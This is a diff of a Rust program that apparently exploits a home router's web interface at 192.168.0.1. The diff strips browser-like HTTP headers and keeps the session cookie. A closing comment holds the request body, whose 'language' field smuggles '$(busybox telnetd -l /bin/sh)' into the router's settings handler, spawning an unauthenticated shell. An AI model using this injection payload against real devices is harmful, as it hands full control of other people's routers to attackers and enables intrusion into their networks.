@@ -81,53 +81,9 @@ async fn main()  {
 	let cookie = cookie.add(&local_token);
 
 	let mut headers = HeaderMap::new();
-	headers.append(
-		USER_AGENT,
-		"Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0".parse().unwrap()
-	);
-	headers.insert(
-		ACCEPT,
-		"application/json, text/javascript, *SLASH*; q=0.01".parse().unwrap()
-	);
-	headers.insert(
-		ACCEPT_LANGUAGE,
-		"de,en-US;q=0.7,en;q=0.3".parse().unwrap()
-	);
-	headers.insert(
-		ACCEPT_ENCODING,
-		"gzip, deflate".parse().unwrap()
-	);
-	headers.insert(
-		CONTENT_TYPE,
-		"application/x-www-form-urlencoded; charset=UTF-8".parse().unwrap()
-	);
-	headers.insert(
-		HeaderName::from_str("X-Requested-With").unwrap(),
-		"XMLHttpRequest".parse().unwrap()
-	);
-	headers.insert(
-		ORIGIN,
-		"http://192.168.0.1".parse().unwrap()
-	);
-	headers.insert(
-		CONNECTION,
-		"keep-alive".parse().unwrap()
-	);
-	headers.insert(
-		REFERER,
-		"http://192.168.0.1/settings.html".parse().unwrap()
-	);
 	headers.insert(
 		COOKIE,
 		HeaderValue::from_str(&cookie).unwrap()
-	);
-	headers.insert(
-		PRAGMA,
-		"no-cache".parse().unwrap()
-	);
-	headers.insert(
-		CACHE_CONTROL,
-		"no-cache".parse().unwrap()
 	);
 
 	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/
